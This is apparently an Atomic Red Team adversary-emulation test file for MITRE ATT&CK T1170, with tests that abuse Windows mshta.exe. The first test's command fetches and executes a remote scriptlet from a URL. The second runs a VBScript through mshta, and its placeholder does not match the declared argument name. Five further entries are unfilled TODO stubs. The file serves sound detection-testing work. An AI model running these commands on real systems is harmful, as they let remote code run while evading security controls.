---
attack_technique: T1170
display_name: Mshta

atomic_tests:
- name: Mshta executes JavaScript Scheme Fetch Remote Payload With GetObject
  description: |
    Test execution of a remote script using mshta.exe
  supported_platforms:
    - windows
  input_arguments:
    file_url:
      description: location of the payload
      type: Url
      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1170/mshta.sct
  executor:
    name: command_prompt
    elevation_required: false
    command: |
      mshta.exe javascript:a=(GetObject('script:#{file_url}')).Exec();close();
      

- name: Mshta calls a local VBScript file to launch notepad.exe
  description: Tests execution of a local program by a VBScript file called by Mshta

  supported_platforms:
    - windows

  input_arguments:
    local_file: 
      description: Create a local VBScript file
      type: path
      default: C:\Temp\mshta_notepad.vbs
    

  executor:
    name: command_prompt
    command: |
      mshta.exe vbscript:Execute("CreateObject(""Wscript.Shell"").Run(""{local_file_path}"")(window.close)")


- name: TODO
  description: |
    TODO

  supported_platforms:
    - windows
    - macos
    - centos
    - ubuntu
    - linux

  input_arguments:
    output_file:
      description: TODO
      type: todo
      default: TODO

  executor:
    name: command_prompt
    command: |
      TODO

- name: TODO
  description: |
    TODO

  supported_platforms:
    - windows
    - macos
    - centos
    - ubuntu
    - linux

  input_arguments:
    output_file:
      description: TODO
      type: todo
      default: TODO

  executor:
    name: command_prompt
    command: |
      TODO

- name: TODO
  description: |
    TODO

  supported_platforms:
    - windows
    - macos
    - centos
    - ubuntu
    - linux

  input_arguments:
    output_file:
      description: TODO
      type: todo
      default: TODO

  executor:
    name: command_prompt
    command: |
      TODO

- name: TODO
  description: |
    TODO

  supported_platforms:
    - windows
    - macos
    - centos
    - ubuntu
    - linux

  input_arguments:
    output_file:
      description: TODO
      type: todo
      default: TODO

  executor:
    name: command_prompt
    command: |
      TODO

- name: TODO
  description: |
    TODO

  supported_platforms:
    - windows
    - macos
    - centos
    - ubuntu
    - linux

  input_arguments:
    output_file:
      description: TODO
      type: todo
      default: TODO

  executor:
    name: command_prompt
    command: |
      TODO
